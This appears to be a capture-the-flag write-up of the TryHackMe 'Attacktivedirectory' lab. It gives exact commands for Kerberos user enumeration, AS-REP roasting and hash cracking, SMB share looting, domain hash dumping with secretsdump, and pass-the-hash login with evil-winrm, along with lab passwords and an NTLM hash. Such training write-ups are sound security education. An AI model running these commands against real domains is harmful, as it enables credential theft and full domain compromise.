---
tags: windows, AD, kerberos, RDP, evil-winrm, kerbrute, smbclient, john, xfreerdp, impacket
---
# THM: Attacktivedirectory

***Overview**: Attacktivedirectory is a Windows machine on Tryhackme rated as intermediate. This machine exploit Kerberos authentication service with an attack known as ASREPRoasting to get credentials which can be used to gain initial foothold on the machine and retrieve information like credentials to access another account. the machine then further exploits an administrative domain account to retrieve hashes and then perform the Pass the hash attack to escalate privileges to root.*

#### Enumeration
- so i'll start by running an nmap scan to check for open ports and services `nmap -sV -sC -T4 -p- 10.10.117.58`

![](/assets/Attacktivedirectory_assets/Pasted%20image%2020221017002351.png)

![](/assets/Attacktivedirectory_assets/Pasted%20image%2020221017002442.png)

- from the nmap scan, I can see some useful information like open ports, domain name, computer name and so on, I can see ports like port 80, Kerberos, SMB, LDAP, RDP, RPC, WinRM and so on
- I'll start by enumerating kerberos, firstly what is Kerberos? Kerberos is a computer network security protocol that authenticates service requests between two or more trusted hosts across an untrusted network, like the internet.
- Since the Kerberos port is open I proceed to enumerate for users using the kerbrute tool with the syntax`~/Scripts/kerbrute userenum --dc 10.10.117.58 -d spookysec.local userlist.txt` and i get some usernames

![](/assets/Attacktivedirectory_assets/Pasted%20image%2020221017001631.png)

#### Exploitation and Foothold
- so I save the users found in the kebrute scan in a file called users
- and now to find the account which I can query a keberos ticket from without a password which is an ASReproastable account and then also get the password hash of the user, I will use the GetNPUsers.py script in impacket to do this using the syntax `/opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.117.58 spookysec.local/ -usersfile users -format john -outputfile hashes` and we save the hash of the user in a file name hashes

![](/assets/Attacktivedirectory_assets/Pasted%20image%2020221017001747.png)

- and then viewing the hashes, I can see that the user we can use is the `svc-admin` user

![](/assets/Attacktivedirectory_assets/Pasted%20image%2020221017003335.png)

- I have a kerberos hash, so I then proceed to cracking the hash with Johntheripper with the syntax `john -wordlist=passwordlist.txt hashes` and got the password as `management2005`.

![](/assets/Attacktivedirectory_assets/Pasted%20image%2020221017003033.png)

- so now that I have the credentials, I'm going to open an RDP session ` xfreerdp /v:10.10.117.58 /cert:ignore /u:svc-admin` and enter the password management2005

![](/assets/Attacktivedirectory_assets/Pasted%20image%2020221016214451.png)

- and after gaining access, I can see the first flag on the desktop

![](/assets/Attacktivedirectory_assets/Pasted%20image%2020221016214519.png)

#### Further Enumeration
- so now that I have the credentials, I will further enumerate smb port using smbclient with those credentials I got, so I run `smbclient -L \\\\10.10.117.58\\ -U=svc-admin%management2005`

![](/assets/Attacktivedirectory_assets/Pasted%20image%2020221016203834.png)

- I am able access the backup share, so enumerating the backup share `smbclient  \\\\10.10.117.58\\backup -U=svc-admin%management2005`, I discover a file backup_credentials.txt, so I get it on my machine

![](/assets/Attacktivedirectory_assets/Pasted%20image%2020221016205255.png)

- I then view the content of the file and get YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

![](/assets/Attacktivedirectory_assets/Pasted%20image%2020221016205513.png)

- so I then decode the encoding found in the backup file and got the output ` backup@spookysec.local:backup2517860`

![](/assets/Attacktivedirectory_assets/Pasted%20image%2020221016205956.png)

- now we have the credentials for the backup account, I'll connect to it via an rdp session buy running the command `xfreerdp /v:10.10.117.58 /cert:ignore /u:backup` and entering the password as `backup2517860`

![](/assets/Attacktivedirectory_assets/Pasted%20image%2020221016213057.png)

- and viewing the file in the desktop, I get the second flag

![](/assets/Attacktivedirectory_assets/Pasted%20image%2020221016213517.png)

#### Privilege Escalation
- looking at this, I can see that this account is a admin account in the domain

![](/assets/Attacktivedirectory_assets/Pasted%20image%2020221017002053.png)

- so now I can attempt dumping the hashes that have been synced to this account using secretsdump.py script in impacket by running `/opt/impacket/examples/secretsdump.py -just-dc-ntlm spookysec.local/backup:backup2517860@10.10.63.191` and then I get the hashes
including that of the administrator

![](/assets/Attacktivedirectory_assets/Pasted%20image%2020221016231126.png)

- so now I have the NTLM hash of the administrator as 0e0363213e37b94221497260b0bcb4fc, I can then perform a pass the hash Attack using Evil-winrm to get administrative access
- According to Wikipedia, A Pass the Hash attack is a hacking technique that allows an attacker to authenticate to a remote server or service by using the underlying NTLM or LanMan hash of a user's password, instead of requiring the associated plaintext password as is normally the case.
- so to perform the attack, I will run `evil-winrm -i 10.10.63.191 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc` and then I get access as Administrator

![](/assets/Attacktivedirectory_assets/Pasted%20image%2020221016233142.png)

- and then looking at the Desktop directory, I get the root flag

![](/assets/Attacktivedirectory_assets/Pasted%20image%2020221016234531.png)

Thank you for reading my writeup, see you next time :)
